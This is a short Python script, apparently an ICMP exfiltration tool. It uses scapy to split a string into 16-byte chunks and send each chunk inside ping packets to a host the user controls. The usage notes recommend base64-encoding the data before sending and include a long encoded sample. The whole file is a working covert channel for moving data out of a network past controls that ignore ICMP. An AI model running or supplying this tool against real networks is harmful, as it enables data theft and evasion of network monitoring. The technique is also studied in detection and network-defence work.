from scapy.all import IP, ICMP, send
 
def send_icmp_chunks(host, string):
    chunk_size = 16
    chunks = [string[i:i+chunk_size] for i in range(0, len(string), chunk_size)]
    for chunk in chunks:
        ip_layer = IP(dst=host)
        icmp_layer = ICMP(type=8) / chunk
        packet = ip_layer / icmp_layer
        send(packet)
        print(f"Sent chunk to {host}: {chunk}")
 
"""
  Example usage:
    You can use DNS names, however IP Address targets are recommended
      host = "icmp.yourdomain.com"  # DNS Address example
      host = "1.2.3.4"        # IP Address example
    It would be best to encode the string with base64 before sending it on the wire
      string = "mko8UMkmzx2CjbzKEh03t7CGewYNFZp6NPoU84QkrcLoCL4N1VEdK+fNaTcXF12tlx5rvcZPpqZ7TWGOX5IAL+r/l8hDYzUuvzDDVVWXtP8ehcXHoxAQbiR+b1PJrJ5KslfjEiR0qIz28uMTL0NT8C+OsPSbWTPLDD1L4ZFH2hw6U9BUm0Vt5fkKe5oLsYBkyIHb4M+ujVc18WRS6YXCWQxBTlxlU/jaO+XABfjPFFQ2ybv+8u6ViboONAIcKjDlRnOelPx+t8OYkNBLomBIchxD4jAh0qGqsKqNj71OyBNRitS5SkpB45JHVWMKstoaUTu4hyLx0UxppdHEBK01wAtja9bRCSzi"
    Execute the function with the host and string argument
      send_icmp_chunks(host, string)
"""





